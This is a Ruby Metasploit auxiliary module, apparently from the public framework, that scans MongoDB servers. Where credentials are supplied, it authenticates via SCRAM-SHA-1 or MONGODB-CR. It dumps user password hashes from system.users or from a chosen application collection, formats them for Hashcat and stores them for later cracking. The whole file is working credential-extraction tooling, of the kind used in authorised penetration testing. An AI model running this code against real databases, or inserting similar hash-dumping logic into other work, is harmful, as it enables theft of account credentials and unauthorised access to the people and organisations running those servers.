##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'
require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Mongodb
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Hash Extractor',
        'Description' => %q{
          This module extracts password hashes from a MongoDB instance and stores
          them in the database for later cracking. By default, it dumps system user
          credentials from the 'system.users' collection. Alternatively,
          it can dump application user hashes from a specified collection.

          The dumped SCRAM hashes are formatted for Hashcat mode 24100 (SCRAM-SHA-1)
          and 24200 (SCRAM-SHA-256), but are not yet wired into Metasploit's
          auxiliary/analyze cracking modules -- use hashcat directly against the
          exported hash, or 'creds -o' to export it, for now.
          Successfully tested against MongoDB 3.6 with and without authentication
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ],
          [ 'URL', 'https://hashcat.net/wiki/doku.php?id=example_hashes' ]
        ],
        'Author' => [
          'h00die',
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, 'Database to query', 'admin']),
        OptString.new('COLLECTION', [ false, 'Custom collection to dump (if empty, dumps system.users)', '']),
        OptString.new('USER_FIELD', [ false, 'Username field name for custom collection', 'username']),
        OptString.new('HASH_FIELD', [ false, 'Hash field name for custom collection', 'hash']),
        OptString.new('USERNAME', [ false, 'Username for authentication if required', '']),
        OptString.new('PASSWORD', [ false, 'Password for authentication if required', ''])
      ]
    )
  end

  def run_host(ip)
    print_status("Connecting to #{ip}...")
    begin
      connect

      if require_auth?
        user = datastore['USERNAME']
        pass = datastore['PASSWORD']
        if user.blank? || pass.blank?
          print_error('Authentication required but no USERNAME/PASSWORD provided')
          return
        end

        print_status("Authentication required, attempting login as '#{user}'...")
        if do_login(user, pass) != :success
          print_error('Login failed')
          return
        end
        print_good('Successfully authenticated')
      else
        print_good('No authentication required')
      end

      if datastore['COLLECTION'].blank?
        dump_system_users
      else
        dump_app_users
      end
    rescue StandardError => e
      print_error("Unable to connect: #{e}")
    ensure
      disconnect
    end
  end

  def dump_system_users
    db = datastore['DB']
    print_status("Dumping MongoDB system users from #{db}.system.users...")

    cmd = BSON::Document.new({})
    pkt = mongodb_build_packet("#{db}.system.users", cmd.to_bson.to_s, number_to_return: -1)

    sock.put(pkt)
    resp = sock.get_once(-1, 10)

    docs = mongodb_parse_docs(resp)

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB System Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc['user']
      creds = doc['credentials'] || {}

      # SCRAM-SHA-1 (Hashcat 24100)
      if creds['SCRAM-SHA-1']
        s1 = creds['SCRAM-SHA-1']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*0*#{b64_user}*#{s1['iterationCount']}*#{s1['salt']}*#{s1['serverKey']}"
        tbl << ['db (SCRAM-SHA-1)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha1')
      end

      # SCRAM-SHA-256 (Hashcat 24200)
      if creds['SCRAM-SHA-256']
        s256 = creds['SCRAM-SHA-256']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*1*#{b64_user}*#{s256['iterationCount']}*#{s256['salt']}*#{s256['serverKey']}"
        tbl << ['db (SCRAM-SHA-256)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha256')
      end

      # MONGODB-CR Legacy (Plain MD5)
      next unless doc['pwd'] && !creds.key?('SCRAM-SHA-1') && !creds.key?('SCRAM-SHA-256')

      hash = doc['pwd']
      tbl << ['db (MONGODB-CR)', user, hash]

      store_hash_credential(service_data, user, hash, 'md5')
    end

    print_good("\n#{tbl}")
  end

  def dump_app_users
    coll = datastore['COLLECTION']
    user_field = datastore['USER_FIELD']
    hash_field = datastore['HASH_FIELD']
    db = datastore['DB']

    print_status("Dumping app hashes from #{db}.#{coll} (Field: #{user_field}:#{hash_field})...")

    cmd = BSON::Document.new({
      hash_field => { '$exists' => true, '$ne' => '' }
    })
    pkt = mongodb_build_packet("#{db}.#{coll}", cmd.to_bson.to_s, number_to_return: -1)

    sock.put(pkt)
    resp = sock.get_once(-1, 10)

    docs = mongodb_parse_docs(resp)

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB Application Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc[user_field].to_s
      hash = doc[hash_field].to_s

      next if user.blank? || hash.blank?

      tbl << ['app', user, hash]

      store_hash_credential(service_data, user, hash)
    end

    print_good("\n#{tbl}")
  end

  def store_hash_credential(service_data, username, hash, jtr_format = nil)
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_data: hash,
      private_type: :nonreplayable_hash
    }
    credential_data[:jtr_format] = jtr_format if jtr_format
    credential_data.merge!(service_data)

    create_credential(credential_data)
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")

    scram_status = auth_scram_sha1(user, password)
    return :success if scram_status == :next_user

    vprint_status('SCRAM-SHA-1 not accepted or failed; trying MONGODB-CR fallback...')
    nonce = get_nonce
    if nonce.present?
      cr_status = auth_cr(user, password, nonce)
      return :success if cr_status == :next_user
    end

    nil
  end

  def auth_scram_sha1(user, password)
    db = datastore['DB']
    digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")

    client_nonce = Rex::Text.rand_text_alphanumeric(24)
    auth_payload = "n=#{user},r=#{client_nonce}"
    client_first_bare = auth_payload
    client_first_message = "n,,#{auth_payload}"

    sasl_start_cmd = BSON::Document.new({
      'saslStart' => BSON::Int32.new(1),
      'mechanism' => 'SCRAM-SHA-1',
      'payload' => BSON::Binary.new(client_first_message)
    })

    pkt = mongodb_build_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(resp)
    return nil unless reply && reply['ok'].to_i == 1

    conversation_id = reply['conversationId']
    server_payload = reply['payload'].data
    server_vars = mongodb_parse_scram_payload(server_payload)

    server_nonce = server_vars['r']
    salt = Rex::Text.decode_base64(server_vars['s'])
    iterations = server_vars['i'].to_i

    salted_password = OpenSSL::PKCS5.pbkdf2_hmac(
      digest_pass,
      salt,
      iterations,
      20,
      OpenSSL::Digest.new('SHA1')
    )

    client_key = OpenSSL::HMAC.digest('sha1', salted_password, 'Client Key')
    stored_key = OpenSSL::Digest::SHA1.digest(client_key)
    client_final_without_proof = "c=biws,r=#{server_nonce}"
    auth_message = "#{client_first_bare},#{server_payload},#{client_final_without_proof}"

    client_signature = OpenSSL::HMAC.digest('sha1', stored_key, auth_message)
    client_proof = Rex::Text.xor(client_key, client_signature)
    client_final_message = "#{client_final_without_proof},p=#{Rex::Text.encode_base64(client_proof)}"

    conv_id_bson = conversation_id.is_a?(Integer) ? BSON::Int32.new(conversation_id) : conversation_id

    sasl_continue_cmd = BSON::Document.new({
      'saslContinue' => BSON::Int32.new(1),
      'conversationId' => conv_id_bson,
      'payload' => BSON::Binary.new(client_final_message)
    })

    pkt = mongodb_build_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(resp)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("SCRAM-SHA-1 exception: #{e.message}")
    nil
  end

  def auth_cr(user, password, nonce)
    db = datastore['DB']
    key = Rex::Text.md5(nonce + user + Rex::Text.md5("#{user}:mongo:#{password}"))

    cmd = BSON::Document.new({
      'authenticate' => BSON::Int32.new(1),
      'user' => user,
      'nonce' => nonce,
      'key' => key
    })

    packet = mongodb_build_packet("#{db}.$cmd", cmd.to_bson.to_s)
    sock.put(packet)
    response = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(response)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("MONGODB-CR exception: #{e.message}")
    nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_nonce
    cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
    pkt = mongodb_build_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)

    sock.put(pkt)
    response = sock.get_once(-1, 5)

    doc = mongodb_parse_doc(response)
    doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
  end

  def require_auth?
    cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
    list_db_pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(list_db_pkt)
    auth_resp = sock.get_once(-1, 5)

    mongodb_have_auth_error?(auth_resp)
  end
end
